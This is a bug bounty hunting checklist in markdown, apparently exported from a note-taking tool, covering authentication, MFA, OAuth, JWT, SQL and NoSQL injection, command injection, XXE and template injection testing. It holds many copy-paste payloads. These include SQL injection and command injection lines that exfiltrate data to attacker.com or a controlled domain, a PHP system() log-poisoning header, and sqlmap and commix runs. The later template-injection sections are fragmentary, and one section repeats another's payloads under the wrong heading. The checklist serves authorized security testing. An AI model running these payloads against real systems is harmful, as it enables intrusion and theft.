# 🎯 Ultimate Bug Bounty OS

> [!info]
> The master dashboard for tracking bug bounty hunting from Rules of Engagement (ROE) to the Final Report. Connects Subdomains, Assets, and Vulnerabilities.

## 📌 1. Rules of Engagement & Scope

- [ ] Review target scope and out-of-scope assets.

- [ ] Verify allowed testing types (e.g., no DDoS/Social Engineering).

- [ ] Set up project structure: `mkdir -p ~/bugbounty/{recon,screenshots,notes,tools}`

- [ ] Configure Burp Suite, VPN, and Note-taking system.


## 🗄️ 2. Connected Databases (Notion Sync)

- **Subdomains DB:** Track all discovered subdomains and open ports.

- **Vulnerabilities DB:** Map findings to subdomains and CVSS scores.


## ⚔️ 3. Execution Checklist


### 🔍 BountyBuddy
- [ ] The World's Most Complete Bug Bounty Hunting Checklist
- [ ] A revolutionary step-by-step guide with authentic terminal commands. Track your progress, copy commands, and become an elite bug hunter.

### 🔍 Terminal-Style Commands

### 🔍 Copy-Paste Ready

### 🔍 Getting Started
- [ ] Essential setup and preparation for bug bounty hunting

### 🔍 Essential Tools Installation
- [ ] Set up your bug bounty hunting arsenal with these essential tools.

### 🔍 Environment Setup Checklist
- [ ] Prepare your testing environment for safe and effective bug hunting.

### 🔍 VPN connection active (hide your real IP)

### 🔍 Isolated virtual machine (Kali Linux recommended)

### 🔍 Burp Suite configured with browser proxy

### 🔍 Organized folder structure for each target

### 🔍 Screenshot tool ready (for evidence)

### 🔍 Note-taking system (Notion/Obsidian)

### 🔍 Create Project Structure
```bash
mkdir -p ~/bugbounty/{recon,screenshots,notes,tools}
```


### 🔍 Identification and Authentication Failures
- [ ] These bugs often have the highest payouts because they directly compromise user accounts

### 🔍 Username/Email Enumeration
- [ ] Comprehensive testing of authentication mechanisms and user registration flows.
- [ ] Recon & Info Gathering - Identify login, register, password reset, and API endpoints
- [ ] HTTP Methods & Parameters - Note GET/POST methods and request parameters
- [ ] Client-Side Validation - Check JS validations, regex, or input constraints
- [ ] Capture Request/Response - Use Burp Suite/ZAP/Postman for templates
- [ ] Response Time Analysis - Compare timing between valid/invalid usernames
- [ ] Check Error Messages - Observe messages for valid vs invalid username/password
- [ ] HTTP Status Codes - Monitor different codes (200, 401, 404) for valid/invalid users
- [ ] Account Lockout - Test if lockout occurs differently for valid vs invalid usernames
- [ ] Password Reset Messages - Compare messages for existing vs non-existing accounts
- [ ] Username-Email OTP Behavior - Check if emails are sent only for valid accounts
- [ ] Reset Token Generation - Test if tokens are created regardless of username validity
- [ ] Case Sensitivity - Test if usernames are case-sensitive during registration/login
- [ ] Special Characters - Test Unicode, SQL injection, XSS in usernames
- [ ] Empty/Null Values - Test blank or null username submissions
- [ ] Long Usernames - Test extremely long inputs (100–1000 chars)
- [ ] Encoded Characters - Test URL/HTML encoded usernames
- [ ] Response Header Differences - Check Set-Cookie, X-headers variations
- [ ] Redirect Patterns - Monitor differences for valid vs invalid users
- [ ] API & GraphQL Endpoints - Test user queries and observe responses for enumeration
- [ ] CAPTCHA Triggering - Test if CAPTCHA appears differently for valid/invalid users

### 🔍 Username Enumeration Testing
```bash
curl -X POST https://target.com/login -d "username=existing_user@target.com&password=wrongpass" -v
```


### 🔍 Rate Limiting Bypass
```bash
curl -H "X-Forwarded-For: 192.168.1.1" https://target.com/login
```


### 🔍 Password Policy Analysis
- [ ] Comprehensive testing of Password Policy Analysis.
- [ ] Recon - Identify login, password reset, OTP endpoints, registration forms, 2FA endpoints; capture requests and note HTTP methods/parameters; check client-side validation
- [ ] Response Analysis - Capture normal responses, status codes, headers, and messages for valid/invalid input
- [ ] Length Requirements - Test minimum, maximum, and empty/zero-length passwords
- [ ] Common Passwords - Test keyboard patterns, top passwords (rockyou.txt), and personal info-based passwords
- [ ] Lockout Threshold - Test exact number of failed attempts before lockout
- [ ] Lockout Duration - Verify lockout period and whether it increases with repeated attempts
- [ ] Lockout Factors - Check if lockout is triggered per username, IP, User-Agent, or location
- [ ] Rate Limiting - Test delays between OTP attempts to bypass restrictions
- [ ] IP/User-Agent Rotation - Attempt bypass of per-IP or per-device limits
- [ ] Account Enumeration - Use different accounts to avoid per-account rate limits
- [ ] Brute Force Testing - Test OTP submission against various status codes [200, 401, 403]
- [ ] Reset Policy Bypass - Test if password reset allows weak or previously restricted passwords
- [ ] Temporary Passwords - Check if system issues weak temporary passwords
- [ ] Reset Token Security - Verify if tokens are guessable or predictable
- [ ] Token Forwarding - Test if Host/Referer/Origin headers can manipulate token acceptance
- [ ] 2FA Bypass - Test if weak passwords or flawed OTPs bypass 2FA
- [ ] Client-Side Validation - Attempt to bypass password rules enforced only on browser-side
- [ ] Race Condition - Attempt OTP spray or multiple reset requests before password is validated

### 🔍 Username Enumeration Testing
```bash
curl -X POST https://target.com/login -d "username=existing_user@target.com&password=wrongpass" -v
```


### 🔍 Rate Limiting Bypass
```bash
curl -H "X-Forwarded-For: 192.168.1.1" https://target.com/login
```


### 🔍 Multi-Factor Authentication (MFA) Bypass
- [ ] Identify weaknesses in MFA implementations (TOTP, SMS, email, push notifications, biometric).
- [ ] Recon - Identify MFA endpoints, methods, enrollment, fallback mechanisms, and capture requests/responses
- [ ] Response Analysis - Note HTTP codes, headers, error messages, and behavior for valid/invalid MFA attempts
- [ ] Direct Endpoint Access - Access protected resources without completing MFA
- [ ] Session Fixation - Reuse sessions to bypass MFA requirements
- [ ] Response/Status Code Manipulation - Modify HTTP responses or codes to skip MFA
- [ ] Rate Limiting Bypass - Use distributed IPs or sessions to bypass attempt limits
- [ ] Device Trust Exploitation - Abuse "remember device" functionality
- [ ] OTP Brute Force - Test 0-6 digit codes for enumeration
- [ ] OTP Reuse - Attempt reuse of previously valid OTPs
- [ ] OTP Race Conditions - Submit same OTP across multiple sessions simultaneously
- [ ] Weak Secret Generation - Test predictable TOTP seeds
- [ ] MFA Fatigue Attacks - Spam push notifications until user accepts
- [ ] Replay Attacks - Reuse push notification responses
- [ ] SIM Swapping / SMS Spoofing - Test account security and intercept SMS codes
- [ ] SMS Flooding - Prevent legitimate SMS delivery or bypass rate limits
- [ ] Email Compromise / Forwarding - Access MFA codes via email vulnerabilities
- [ ] Link/Code Reuse - Attempt reuse of previously sent email codes
- [ ] Spoofing Detection Bypass - Use photos, videos, or synthetic biometrics
- [ ] Fallback Mechanism Abuse - Force fallback to weaker authentication
- [ ] Liveness Detection - Test anti-spoofing mechanisms
- [ ] Missing MFA Enforcement - Test endpoints without MFA protection
- [ ] MFA Downgrade - Force app to use weaker authentication
- [ ] API Endpoint MFA - Ensure APIs enforce the same MFA rules as frontend
- [ ] Weak Default Settings - Test default MFA configurations
- [ ] Enrollment Bypass - Skip or manipulate MFA enrollment
- [ ] Backup Authentication - Test alternative methods to bypass MFA
- [ ] MFA Metadata Leakage - Check for information disclosure in headers or responses

### 🔍 OAuth 2.0 / OpenID Connect Testing
- [ ] Test authorization flows, token handling, and endpoint security.
- [ ] Recon - Identify OAuth endpoints, flows (Authorization Code, Implicit, PKCE, Client Credentials), redirect URIs, client IDs/secrets; capture requests/responses
- [ ] Response Analysis - Note status codes, error messages, headers, and token handling for valid/invalid requests
- [ ] Authorization Code Interception - Capture and reuse authorization codes
- [ ] CSRF in OAuth Flow - Exploit cross-site request forgery in the authorization flow
- [ ] Redirect URI Manipulation - Change redirect URI to attacker-controlled URL
- [ ] State Parameter Bypass - Test missing or predictable state values
- [ ] PKCE Bypass Attempts - Attempt to bypass PKCE verification
- [ ] Covert Redirect Attacks - Abuse open redirects in the OAuth flow
- [ ] Access Token Exposure - Test for leakage via URL fragments, logs, or referrers
- [ ] Fragment Manipulation - Modify URL fragment to hijack tokens
- [ ] PostMessage Interception - Exploit insecure cross-origin message handling
- [ ] Token Replay Attacks - Reuse tokens in other sessions or clients
- [ ] Client Secret Exposure - Check for secrets in code, repos, or logs
- [ ] Client Impersonation - Attempt unauthorized access using client credentials
- [ ] Scope Privilege Escalation - Test if client can obtain higher privileges than allowed
- [ ] Token Endpoint Abuse - Generate tokens without proper authorization

### 🔍 Session Management Testing
- [ ] Ensure secure handling of session tokens and cookies.
- [ ] Recon - Identify session cookies, authentication tokens, and session-related endpoints; capture requests/responses
- [ ] Response Analysis - Note HTTP status codes, headers, cookies, and messages for valid/invalid sessions
- [ ] Secure & HttpOnly Flags - Check if cookies are missing Secure or HttpOnly attributes

### 🔍 SameSite Attribute - Test CSRF bypass via cookies
- [ ] Domain/Path Manipulation - Test subdomain leakage or path traversal via cookies
- [ ] Expires/Max-Age Manipulation - Test long-lived or stale cookies
- [ ] Session Token Entropy & Prediction - Test randomness and predictability of session IDs
- [ ] Session Fixation - Attempt to set session ID before login

### 🔍 Session Hijacking - Steal or reuse valid sessions
- [ ] Concurrent Sessions - Test multiple active sessions per user and access control
- [ ] Session Timeout & Expiry - Test access after session expiration
- [ ] Session Adoption - Use existing sessions of other users
- [ ] Pre-Session Attacks - Exploit pre-auth session behavior
- [ ] Session Donation - Share session IDs between accounts
- [ ] Login CSRF - Force login to attacker-controlled account
- [ ] Logout & Session Invalidation - Check incomplete logout, persistence, browser back access, cross-tab sharing, and concurrent invalidation

### 🔍 JWT / Token Testing
- [ ] Test JSON Web Token (JWT) or custom token mechanisms for security flaws.
- [ ] Recon - Identify JWT usage, endpoints, and token flow; capture tokens from requests/responses
- [ ] Response Analysis - Note token-related headers, status codes, error messages, and validation behavior
- [ ] Algorithm Confusion - Test RS256 → HS256 or other algorithm downgrades
- [ ] Null Signature Attack - Test if JWT with no signature is accepted
- [ ] Key Confusion Attack - Exploit mismatched key usage
- [ ] JWK Header Injection - Inject malicious keys in JWK header
- [ ] Kid Header Manipulation - Test JWT verification bypass via kid
- [ ] Claim Injection - Inject custom claims into JWT payload
- [ ] Privilege Escalation via Claims - Modify roles or permissions
- [ ] Audience Claim Bypass - Modify aud claim to bypass restrictions
- [ ] Expiration Time Manipulation - Extend or shorten exp claim
- [ ] Custom Claim Injection - Add arbitrary claims to manipulate application logic

### 🔍 Injection Attacks
- [ ] These vulnerabilities allow attackers to execute unintended commands or queries

### 🔍 SQL Injection

### 🔍 Comprehensive SQL injection testing methodology.
- [ ] MySQL error extraction (test in params, headers, body, query strings)

### 🔍 PostgreSQL error messages (same points)

### 🔍 MSSQL error information
- [ ] Enumerate DB, tables, columns with UNION-Based SQLi

### 🔍 Inject true/false conditions (check page changes)

### 🔍 Use length/content diff to infer data

### 🔍 Sleep/delay queries to confirm injection

### 🔍 Second-order: store payload then trigger later

### 🔍 Out-of-band DNS/HTTP exfil (only if allowed)

### 🔍 Basic SQL Injection Detection
```bash
# Basic URL testing
sqlmap -u "http://target.com/page.php?id=1" --batch --random-agent
# POST data testing
sqlmap -u "http://target.com/login.php" --data "username=admin&password=pass" --batch
# Cookie-based testing
sqlmap -u "http://target.com/page.php" --cookie "PHPSESSID=value; auth=token" --batch
# Header-based testing
sqlmap -u "http://target.com/page.php" --headers "X-Forwarded-For: *" --batch
```


### 🔍 Union-Based SQL Injection
```bash
# Basic UNION detection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# Column enumeration
' UNION SELECT 1,2,3,4,5--
' ORDER BY 1--
' ORDER BY 10--
# Database enumeration
' UNION SELECT schema_name,NULL FROM information_schema.schemata--
' UNION SELECT table_name,column_name FROM information_schema.columns--
# -----------------------
# SQLmap
# Basic UNION testing
sqlmap -u "http://target.com/page.php?id=1" --technique=U --batch
# Force UNION with column detection
sqlmap -u "http://target.com/page.php?id=1" --technique=U --union-cols=1-10 --batch
# UNION with specific database enumeration
sqlmap -u "http://target.com/page.php?id=1" --technique=U --dbs --batch
# Extract specific data with UNION
sqlmap -u "http://target.com/page.php?id=1" --technique=U -D database_name -T table_name --dump
```


### 🔍 Error-Based SQL Injection
```bash
# MySQL Error-based
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
# MSSQL Error-based
' AND 1=convert(int,(SELECT @@version))--
' AND 1=cast((SELECT @@version) as int)--
# Oracle Error-based
' AND 1=ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))--
' AND 1=XMLType((select user from dual))--
#PostgreSQL Error-based
' AND 1=cast((SELECT version()) as int)--
' AND 1=(select cast(version() as int))--
# ---------------------------------------------
# SQLmap
# Error based injection testing
sqlmap -u "http://target.com/page.php?id=1" --technique=E --batch
# Verbose error based with database enumeration
sqlmap -u "http://target.com/page.php?id=1" --technique=E --dbs -v 3
# Error based with specific DBMS
sqlmap -u "http://target.com/page.php?id=1" --technique=E --dbms=mysql --batch
# Force errorbased with aggressive testing
sqlmap -u "http://target.com/page.php?id=1" --technique=E --level=5 --risk=3
```


### 🔍 Boolen-Based Blind SQL Injection
```bash
# Basic boolean tests
' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(user(),1,1))='r'--
# Length-based enumeration
' AND LENGTH(database())=8--
' AND LENGTH((SELECT table_name FROM information_schema.tables LIMIT 1))>5--
# Character-by-character extraction
' AND ASCII(SUBSTRING((SELECT user()),1,1))>100--
' AND SUBSTRING((SELECT user()),1,1)='r'--
# ------------------------------------------
#SQLmap
# Boolean based blind injection
sqlmap -u "http://target.com/page.php?id=1" --technique=B --batch
# Blind injection with custom true/false strings
sqlmap -u "http://target.com/page.php?id=1" --technique=B --string="Welcome" --batch
# Blind injection with NOT string detection
sqlmap -u "http://target.com/page.php?id=1" --technique=B --not-string="Error" --batch
# Advanced blind injection with threading
sqlmap -u "http://target.com/page.php?id=1" --technique=B --threads=10 --batch
```


### 🔍 Time-Based SQL Injection
```bash
# MySQL Time-based
' AND SLEEP(5)--
' AND (SELECT SLEEP(5) FROM dual WHERE database()='test')--
' AND IF(1=1,SLEEP(5),0)--
# MSSQL Time-based
'; WAITFOR DELAY '00:00:05'--
' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5)
# PostgreSQL Time-based
'; SELECT pg_sleep(5)--
' AND 1=(SELECT COUNT(*) FROM generate_series(1,1000000))--
# Oracle Time-based
' AND 1=(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)--
' AND DBMS_PIPE.receive_message('a',5) is null--
# ----------------------------------------------
# SQLmap
# Time based blind injection
sqlmap -u "http://target.com/page.php?id=1" --technique=T --batch
# Time-based with custom delay
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=10 --batch
# Time-based with timeout adjustment
sqlmap -u "http://target.com/page.php?id=1" --technique=T --timeout=30 --batch
# Aggressive time-based testing
sqlmap -u "http://target.com/page.php?id=1" --technique=T --level=5 --risk=3
```


### 🔍 OOB-Based SQL Injection
```bash
# DNS-based OOB (MySQL)
' AND (SELECT LOAD_FILE(CONCAT('\\',version(),'.attacker.com\share')))--
' UNION SELECT LOAD_FILE(CONCAT('\\',user(),'.attacker.com\share'))--
# HTTP-based OOB
' UNION SELECT 1,2,LOAD_FILE('http://attacker.com/log.php?data='||user())--
# MSSQL OOB via xp_cmdshell
'; EXEC xp_cmdshell 'nslookup attacker.com'--
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://attacker.com"'--
# Oracle OOB
' UNION SELECT UTL_HTTP.request('http://attacker.com/'||user) FROM dual--
' UNION SELECT UTL_INADDR.get_host_address('attacker.com') FROM dual--
# ------------------------------------------------------
# SQLmap
# OOB DNS testing (requires DNS server)
sqlmap -u "http://target.com/page.php?id=1" --dns-domain=attacker.com --batch
# Out of Band with custom DNS server
sqlmap -u "http://target.com/page.php?id=1" --dns-domain=yourdns.com --dns-server=8.8.8.8
# Out-of-Band HTTP exfiltration
sqlmap -u "http://target.com/page.php?id=1" --technique=U --second-url="http://attacker.com/log"
```


### 🔍 WAF Bypass SQL Injection
```bash
# WAF bypass with tampering scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=base64encode,charencode,randomcase --batch
# Multiple tamper scripts for different WAF's
sqlmap -u "http://target.com/page.php?id=1" --tamper=apostrophemask,apostrophenullencode,appendnullbyte --batch
# Cloudflare bypass example
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode --random-agent --delay=3
```


### 🔍 Ultimate SQLMap Automation
```bash
# Comprehensive SQL injection test
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUST --level=5 --risk=3 --threads=10 --timeout=30 --retries=3 --randomize="User-Agent,X-Forwarded-For" --tamper=base64encode,charencode --banner --current-user --current-db --hostname --dbs --batch --flush-session -v 3
```


### 🔍 NoSQL Injection
- [ ] Testing NoSQL databases like MongoDB for injection vulnerabilities.

### 🔍 MongoDB authentication bypass

### 🔍 MongoDB JavaScript injection

### 🔍 NoSQL operator injection testing

### 🔍 NoSQL Injection $ne (Not Equal) Bypass
```bash
# Basic authentication bypass - Login without knowing password
curl -X POST "https://target.com/login" -H "Content-Type: application/json" -d '{"username":"admin","password":{"$ne":""}}'
# Alternative $ne payloads
curl -X POST "https://target.com/login" -H "Content-Type: application/json" -d '{"username":"admin","password":{"$ne":null}}'
curl -X POST "https://target.com/login" -H "Content-Type: application/json" -d '{"username":"admin","password":{"$ne":"wrongpassword"}}'
# URL encoded version for GET requests
curl "https://target.com/search?username=admin&password[$ne]="
# Form data version
curl -X POST "https://target.com/login" -d "username=admin&password[$ne]=" -H "Content-Type: application/x-www-form-urlencoded"
```


### 🔍 NoSQL Injection $regex Expression Injection
```bash
# Basic authentication bypass - Login without knowing password
curl -X POST "https://target.com/login" -H "Content-Type: application/json" -d '{"username":"admin","password":{"$ne":""}}'
# Alternative $ne payloads
curl -X POST "https://target.com/login" -H "Content-Type: application/json" -d '{"username":"admin","password":{"$ne":null}}'
curl -X POST "https://target.com/login" -H "Content-Type: application/json" -d '{"username":"admin","password":{"$ne":"wrongpassword"}}'
# URL encoded version for GET requests
curl "https://target.com/search?username=admin&password[$ne]="
# Form data version
curl -X POST "https://target.com/login" -d "username=admin&password[$ne]=" -H "Content-Type: application/x-www-form-urlencoded"
```


### 🔍 NoSQL Injection $where Clause Exploitation
```bash
# Basic $where injection for authentication bypass
curl -X POST "https://target.com/login" -H "Content-Type: application/json" -d '{"$where":"this.username == '''admin''' || true"}'
# $where with sleep for time-based detection
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"$where":"sleep(5000) || true"}'
# Data extraction via $where
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"$where":"this.username.match(/^admin/)"}'
# Boolean-based $where injection
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"$where":"this.username.length == 5"}'
```

- [ ] NoSQL Injection $where Clause JavaScript Execution
```bash
# Basic JavaScript execution
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"$where":"function() { return true; }"}'
# JavaScript function with logic
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"$where":"function() { return this.username == '''admin'''; }"}'
# JavaScript with external code execution (if eval available)
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"$where":"function() { var x = '''malicious code'''; return true; }"}'
# Time-based JavaScript injection
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"$where":"function() { var start = new Date(); while((new Date() - start) < 5000); return true; }"}'
# JavaScript error-based injection
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"$where":"function() { throw new Error('''injection test'''); }"}'
```


### 🔍 NoSQL Injection $gt/$lt Comparison Attacks
```bash
# Greater than bypass
curl -X POST "https://target.com/login" -H "Content-Type: application/json" -d '{"username":"admin","password":{"$gt":""}}'
# Less than bypass
curl -X POST "https://target.com/login" -H "Content-Type: application/json" -d '{"username":"admin","password":{"$lt":"zzz"}}'
# Range-based enumeration
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"age":{"$gt":18,"$lt":65}}'
# Greater than or equal
curl -X POST "https://target.com/search" -H "Content-Type: application/json" -d '{"salary":{"$gte":50000}}'
# URL encoded version
curl "https://target.com/search?age[$gt]=18&age[$lt]=65"
```


### 🔍 NoSQL Injection eval() Function Exploitation
```bash
# Direct eval injection (if available)
curl -X POST "https://target.com/eval" -H "Content-Type: application/json" -d '{"expression": "1+1"}'
# Malicious eval payload
curl -X POST "https://target.com/eval" -H "Content-Type: application/json" -d '{"expression": "db.users.find().toArray()"}'
# eval with system commands (if available)
curl -X POST "https://target.com/eval" -H "Content-Type: application/json" -d '{"expression": "cat('''/etc/passwd''')"}'
```


### 🔍 Automate NoSQL Injection Testing
```bash
# Install NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
# Basic MongoDB testing
python nosqlmap.py -t "https://target.com/login" -p username,password
# Verbose mode
python nosqlmap.py -t "https://target.com/login" -p username,password -v
# Custom payload testing
python nosqlmap.py -t "https://target.com/search" -p query --payload-file custom_payloads.txt
```


### 🔍 Command Injection
- [ ] Testing for operating system command injection vulnerabilities.
- [ ] Test shell metacharacters ; && | (in query params, POST body, HTTP headers like User-Agent/X-Forwarded-For, file name fields)
- [ ] Command chaining (whoami;id) – inject in form fields, URL params, JSON keys
- [ ] I/O redirection (> /tmp/out) – test upload paths, report names, search fields
- [ ] Background processes (&, nohup) – same injection points as above
- [ ] Environment variables ($PATH, $IFS) – try in upload names, custom headers, JSON values
- [ ] Time-based payloads (sleep/ping delay) – test params that hit server-side scripts or CLI tools
- [ ] OOB/DNS callbacks (nslookup token.oob) – use on fields likely passed to system utilities (ping, curl, etc.)
- [ ] Check for file creation (/tmp/poc) – only if you have a legal way to see server file output
- [ ] Log poisoning → insert payload in User-Agent/Referer fields that might be evaluated later
- [ ] Config/service manipulation – look at admin panels, YAML/INI/JSON config upload endpoints
- [ ] Scheduled task/cron abuse – only for authorized environments (not normal bug bounty)

### 🔍 Basic Command Injection Test
```bash
# Basic metacharacter injection in URL parameters
curl "https://target.com/ping?host=127.0.0.1;whoami"
curl "https://target.com/ping?host=127.0.0.1&&id"
curl "https://target.com/ping?host=127.0.0.1|ls"
curl "https://target.com/ping?host=127.0.0.1%3bwhoami" # URL encoded semicolon
# POST body injection
curl -X POST "https://target.com/ping" -d "host=127.0.0.1;whoami" -H "Content-Type: application/x-www-form-urlencoded"
# JSON payload injection
curl -X POST "https://target.com/api/ping" -H "Content-Type: application/json" -d '{"host":"127.0.0.1;whoami"}'
# HTTP header injection
curl "https://target.com/page" -H "User-Agent: Mozilla/5.0;whoami" -H "X-Forwarded-For: 127.0.0.1;id"
# File name field injection (in multipart uploads)
curl -X POST "https://target.com/upload" -F "file=@test.txt;filename=test;whoami;.txt"
```


### 🔍 Command Chaining Command Injection Test
```bash
# Multiple command execution
curl "https://target.com/search?q=test;whoami;id;ls"
curl "https://target.com/search?q=test&&whoami&&id"
curl "https://target.com/search?q=test||whoami||id"
# Form field injection
curl -X POST "https://target.com/contact" -d "name=test;whoami&email=test@test.com" -H "Content-Type: application/x-www-form-urlencoded"
# JSON key injection
curl -X POST "https://target.com/api/search" -H "Content-Type: application/json" -d '{"query":"test;whoami;id"}'
# Advanced chaining with error handling
curl "https://target.com/ping?host=127.0.0.1;(whoami||id)&&ls"
```


### 🔍 Time Based Command Injection Test
```bash
# Sleep-based delays (Linux/Unix)
curl "https://target.com/ping?host=127.0.0.1;sleep 10"
curl "https://target.com/ping?host=127.0.0.1&&sleep 10"
curl "https://target.com/ping?host=127.0.0.1|sleep 10"
# Windows timeout
curl "https://target.com/ping?host=127.0.0.1&timeout /t 10"
# Ping delay (cross-platform)
curl "https://target.com/search?q=test;ping -c 10 127.0.0.1"
curl "https://target.com/search?q=test;ping -n 10 127.0.0.1" # Windows
# Complex time-based payloads
curl "https://target.com/upload" -F "filename=test.txt;sleep 15;echo done"
# POST body time injection
curl -X POST "https://target.com/process" -d "data=input;sleep 20" -H "Content-Type: application/x-www-form-urlencoded"
```


### 🔍 OOB Detection Command Injection
```bash
# DNS callbacks (replace 'your-domain.com' with your controlled domain)
curl "https://target.com/ping?host=127.0.0.1;nslookup token123.your-domain.com"
curl "https://target.com/ping?host=127.0.0.1;dig token456.your-domain.com"
# HTTP callbacks
curl "https://target.com/ping?host=127.0.0.1;curl http://your-domain.com/callback/token789"
curl "https://target.com/ping?host=127.0.0.1;wget http://your-domain.com/callback/token999"
# Advanced OOB with data exfiltration
curl "https://target.com/search?q=test;whoami|curl -X POST -d @- http://your-domain.com/data"
# DNS exfiltration
curl "https://target.com/ping?host=127.0.0.1;nslookup `whoami`.your-domain.com"
```


### 🔍 Log Poisoning Command Injection Test
```bash
# User-Agent log poisoning
curl "https://target.com/page" -H "User-Agent: <?php system($_GET['cmd']); ?>"
# Referer header poisoning
curl "https://target.com/page" -H "Referer: https://evil.com/<?php system('whoami'); ?>"
# Combined header poisoning
curl "https://target.com/api/endpoint" -H "User-Agent: Mozilla/5.0;whoami" -H "X-Forwarded-For: 127.0.0.1';whoami;'" -H "X-Real-IP: 127.0.0.1;id"
# Log injection in form fields
curl -X POST "https://target.com/contact" -d "message=Hello;whoami;#normal_message_content"
```


### 🔍 Burpsuite Extension
```bash
# Recommended Burp Suite extensions for command injection:
# 1. Command Injection Attacker
# 2. Autorize
# 3. Active Scan++
# 4. Param Miner (for finding hidden parameters)
# 5. Backslash Powered Scanner
# Manual Burp Suite testing steps:
# 1. Intercept requests in Proxy
# 2. Send to Repeater
# 3. Insert payloads in parameters
# 4. Check response time and content
# 5. Use Intruder for automated payload testing
```


### 🔍 Automate Command Injection
```bash
# Install Commix
git clone https://github.com/commixproject/commix.git
cd commix
# Basic URL testing
python commix.py --url="https://target.com/ping?host=127.0.0.1"
# POST data testing
python commix.py --url="https://target.com/ping" --data="host=127.0.0.1"
# Cookie-based injection
python commix.py --url="https://target.com/page" --cookie="session=value"
# Custom headers testing
python commix.py --url="https://target.com/page" --headers="User-Agent:test"
# Verbose mode with all techniques
python commix.py --url="https://target.com/ping?host=127.0.0.1" --verbose --technique=B,T,F
# Time-based testing only
python commix.py --url="https://target.com/ping?host=127.0.0.1" --technique=T
# File-based testing
python commix.py --url="https://target.com/ping?host=127.0.0.1" --technique=F --file-dest="/tmp/"
```


### 🔍 XML External Entity (XXE) Injection
- [ ] Malicious XML input can allow local file disclosure, SSRF, or remote resource loading.
- [ ] Locate XML input points: SOAP requests, REST APIs accepting XML, SAML assertions, XML file uploads, config endpoints
- [ ] Local file disclosure: try accessing /etc/passwd, logs, config files, or source code via ENTITY injection
- [ ] Remote file inclusion & SSRF: load external DTDs, schemas, or remote resources (HTTP/FTP) via XXE
- [ ] Blind XXE: exfiltrate data using DNS/HTTP callbacks, time-based delays, or error-based triggers
- [ ] Filter bypass techniques: nested entities, parameter entities, URL encoding, CDATA sections
- [ ] Second-order XXE: store payload in XML input and trigger later in multi-step workflows
- [ ] Authentication bypass via XPath injection in login or auth XML endpoints
- [ ] Information disclosure & node enumeration using XPath queries; include blind/boolean logic
- [ ] Billion Laughs, Quadratic Blowup, or recursive entity attacks to test parser limits and memory exhaustion
- [ ] Check responses for file content, network requests, delays, parser errors, or crashes to confirm vulnerabilities

### 🔍 XPath Injection
- [ ] Injecting XPath queries to bypass authentication or extract XML data.
- [ ] Enumerate XML nodes / structure (login forms, SOAP/SAML, search fields)
- [ ] Authentication bypass via crafted XPath conditions (login/auth endpoints)
- [ ] Extract info from XML (usernames, emails) via injection (GET/POST fields, SOAP APIs)
- [ ] Blind/boolean-based XPath injection (login/search/filter inputs)

### 🔍 XPath Injection
```bash
# Some References
```

- [ ] https://swisskyrepo.github.io/PayloadsAllTheThings/XPATH%20Injection/
```bash
```

- [ ] https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation

### 🔍 Server-Side Template Injection
- [ ] Exploit template engines to execute code on the server.
- [ ] Detect & exploit Jinja2 (Python templates) – test login forms, comments, search inputs
- [ ] Detect & exploit Twig (PHP templates) – test user profile fields, forms, comments
- [ ] Detect & exploit Freemarker (Java) – test web forms, parameters, API inputs
- [ ] Detect & exploit Velocity (Java templates) – test text fields, URL params, POST data
- [ ] Detect & exploit Mustache templates – test comments, profile forms, search bars
- [ ] Detect & exploit Handlebars.js – test forms, templates, user-submitted content
- [ ] Execute arbitrary code via template injection – any reflected input rendered by server
- [ ] Access server file system – test file read in inputs/comments/forms
- [ ] Test network requests / SSRF – try template injection in URLs, API params
- [ ] Read environment variables – test user inputs in server-rendered templates
- [ ] Extract sensitive config files – test template fields in admin forms, uploads

### 🔍 Jinja2 (Python Templates)
```bash
# Detection Payloads..
```

```bash
```

```bash
```

- [ ] {{ config }}
```bash
```

```bash
```

```bash
```

- [ ] {{''.__class__.__mro__[2].__subclasses__()}}
```bash
```

- [ ] {% endraw %}
- [ ] # Testing Locations:
```bash
```


### 🔍 Login error messages
```bash
```


### 🔍 User profile bio/description fields
```bash
```


### 🔍 Search result templates
```bash
```


### 🔍 Email templates
```bash
```


### 🔍 Comment sections
```bash
```


### 🔍 Form validation messages
- [ ] # Reference
```bash
```

- [ ] https://github.com/payloadbox/ssti-payloads
```bash
```

- [ ] https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/

### 🔍 Twig (PHP Templates)
```bash
# Detection Payloads..
```

```bash
```

```bash
```

- [ ] {{ dump() }}
```bash
```

- [ ] {{ _self }}
```bash
```

- [ ] {{_self.env.getGlobals()}}
- [ ] # Testing Locations:
```bash
```


### 🔍 User profile customization
```bash
```


### 🔍 Dynamic page titles
```bash
```


### 🔍 Form field labels
```bash
```


### 🔍 Email template customization
```bash
```


### 🔍 CMS content fields

### 🔍 Freemarker (Java Templates)
```bash
# Detection Payloads:
```

```bash
```

- [ ] ${"test".substring(0,1)}
```bash
```

- [ ] <#assign ex="freemarker.template.utility.Execute"?new()>
